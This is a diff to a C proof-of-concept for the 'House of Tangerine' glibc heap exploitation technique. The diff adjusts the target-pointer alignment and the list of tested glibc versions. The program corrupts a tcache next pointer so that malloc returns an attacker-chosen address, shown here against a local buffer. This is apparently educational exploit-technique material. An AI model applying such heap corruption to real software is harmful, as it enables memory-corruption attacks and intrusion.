@@ -13,7 +13,7 @@
 #define SIZE_3 (0x80-HEADER)
 
 /**
- * Tested on GLIBC 2.39 and 2.34 (x86_64
+ * Tested on GLIBC 2.31 (x86_64 & aarch64) and 2.27 (x86_64)
  *
  * House of Tangerine abuses a _int_free call to the top chunk in sysmalloc 
  * to corrupt heap without needing to call free() directly
@@ -30,9 +30,9 @@ int main()
   setvbuf(stdin, NULL,_IONBF,0);
   setvbuf(stderr,NULL,_IONBF,0);
 
-  uint64_t top_size, new_top_size, vuln_tcache, *heap_ptr, *target;
-  char win[0x10] = "WIN\0";
-  target = (uint64_t*) win;
+  uint64_t top_size, new_top_size, vuln_tcache, target, *heap_ptr;
+  char win[0x10] = "WIN\0\0\0\0\0WIN\0";
+  target = ((uint64_t)win+8)&0xfffffffffffffff0;
   
   // first allocation 
   heap_ptr = malloc(SIZE_1); 
@@ -83,7 +83,7 @@ int main()
   assert((uint64_t)heap_ptr < (uint64_t)vuln_tcache);
   
   // corrupt next ptr into points to target
-  heap_ptr[(vuln_tcache-(uint64_t)heap_ptr)/8] = (uint64_t)target;
+  heap_ptr[(vuln_tcache-(uint64_t)heap_ptr)/8] = target;
 
   // allocate first tcache (corrupt next tcache bin)
   heap_ptr = malloc(SIZE_1);
@@ -92,5 +92,5 @@ int main()
 
   // proof that heap_ptr now points to the same string as target
   printf("%s\n", heap_ptr);
-  assert(heap_ptr == target);
+  assert((uint64_t)heap_ptr == target);
 }
